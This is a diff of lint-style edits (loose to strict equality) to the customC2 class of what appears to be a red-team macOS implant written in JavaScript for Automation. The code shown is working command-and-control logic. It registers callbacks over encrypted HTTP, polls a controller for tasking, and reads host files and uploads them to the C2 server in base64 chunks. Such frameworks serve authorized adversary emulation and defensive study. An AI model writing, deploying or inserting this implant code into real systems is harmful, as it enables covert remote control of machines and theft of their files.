@@ -186,7 +186,7 @@ class customC2 extends baseC2{
 	setConfig(params){
 		//A RESTful base config has 3 updatable components
 		//  BaseURL (includes Port), CallbackInterval, and KillDate (not implemented yet)
-		if(params['commands'] != undefined){
+		if(params['commands'] !== undefined){
 		    this.commands = params['commands'];
 		}
 	}
@@ -204,7 +204,7 @@ class customC2 extends baseC2{
             var sessionID = this.negotiate_key();
             var jsondata = this.htmlPostData(this.getPostNewCallbackEKE_AES_PSK_Path(sessionID), JSON.stringify(info));
             //var jsondata = this.htmlPostData("api/v1.1/crypto/EKE/" + sessionID, JSON.stringify(info));
-        }else if(this.aes_psk != ""){
+        }else if(this.aes_psk !== ""){
             var jsondata = this.htmlPostData(this.getPostNewCallbackAES_PSK_Path(), JSON.stringify(info));
             //var jsondata = this.htmlPostData("api/v1.1/crypto/aes_psk/" + apfell.uuid, JSON.stringify(info));
         }else{
@@ -214,7 +214,7 @@ class customC2 extends baseC2{
         apfell.id = jsondata.id;
 
         // if we fail to get an ID number then exit the application
-        if(apfell.id == undefined){ $.NSApplication.sharedApplication.terminate(this); }
+        if(apfell.id === undefined){ $.NSApplication.sharedApplication.terminate(this); }
 
         return jsondata;
 	}
@@ -258,7 +258,7 @@ class customC2 extends baseC2{
 	     var url = this.baseurl + urlEnding;
         //console.log(url);
         //encrypt our information before sending it
-        if(this.aes_psk != ""){
+        if(this.aes_psk !== ""){
             var data = this.encrypt_message(sendData);
         }else{
             var data = $.NSString.alloc.initWithUTF8String(sendData);
@@ -279,7 +279,7 @@ class customC2 extends baseC2{
 				var responseData = $.NSURLConnection.sendSynchronousRequestReturningResponseError(req,response,error);
 				var resp = $.NSString.alloc.initWithDataEncoding(responseData, $.NSUTF8StringEncoding);
 				var deepresp = ObjC.deepUnwrap(resp);
-				if(deepresp[0] == "<"|| deepresp.length == 0 || deepresp.includes("ERROR: Requested URL")){
+				if(deepresp[0] === "<"|| deepresp.length === 0 || deepresp.includes("ERROR: Requested URL")){
                     //this means we likely got back some form of error or redirect message, not our actual data
                     //console.log(deepresp);
                     continue;
@@ -288,12 +288,11 @@ class customC2 extends baseC2{
 				//console.log("response: " + resp.js);
 				if(!this.exchanging_keys){
 				    //we're not doing the initial key exchange
-				    if(this.aes_psk != ""){
+				    if(this.aes_psk !== ""){
 				        //if we do need to decrypt the response though, do that
                         if(json){
                             resp = ObjC.unwrap(this.decrypt_message(resp));
-                            var jsondata = JSON.parse(resp);
-                            return jsondata;
+                            return JSON.parse(resp);
                         }else{
                             return this.decrypt_message(resp);
                         }
@@ -331,13 +330,13 @@ class customC2 extends baseC2{
                 var responseData = $.NSURLConnection.sendSynchronousRequestReturningResponseError(req,response,error);
                 var data =$.NSString.alloc.initWithDataEncoding(responseData, $.NSUTF8StringEncoding);
                 var deepresp = ObjC.deepUnwrap(data);
-				if(deepresp[0] == "<"|| deepresp.length == 0 || deepresp.includes("ERROR: Requested URL")){
+				if(deepresp[0] === "<"|| deepresp.length === 0 || deepresp.includes("ERROR: Requested URL")){
                     //this means we likely got back some form of error or redirect message, not our actual data
                     //console.log(deepresp);
                     continue;
                 }
 
-                if(this.aes_psk != ""){
+                if(this.aes_psk !== ""){
                     var decrypted_message = this.decrypt_message(data);
                 }else{
                     var decrypted_message = data;
@@ -357,7 +356,7 @@ class customC2 extends baseC2{
             var url = this.getPostResponsePath(task.id);
             var chunkSize = 512000; //3500;
             try{
-                if(params[0] != "/"){
+                if(params[0] !== "/"){
                     var fileManager = $.NSFileManager.defaultManager;
                     var cwd = fileManager.currentDirectoryPath.js;
                     params = cwd + "/" + params;
@@ -371,10 +370,10 @@ class customC2 extends baseC2{
             // always round up to account for chunks that are < chunksize;
             var numOfChunks = Math.ceil(fileSize / chunkSize);
             var registerData = JSON.stringify({'total_chunks': numOfChunks, 'task': task.id, "full_path": params});
-            var registerData = convert_to_nsdata(registerData);
+            registerData = convert_to_nsdata(registerData);
             var registerFile = this.htmlPostData(url, JSON.stringify({"response": registerData.base64EncodedStringWithOptions(0).js}));
             //var registerFile = this.postResponse(task, registerData);
-            if (registerFile['status'] == "success"){
+            if (registerFile['status'] === "success"){
                 handle.seekToFileOffset(0);
                 var currentChunk = 1;
                 var data = handle.readDataOfLength(chunkSize);
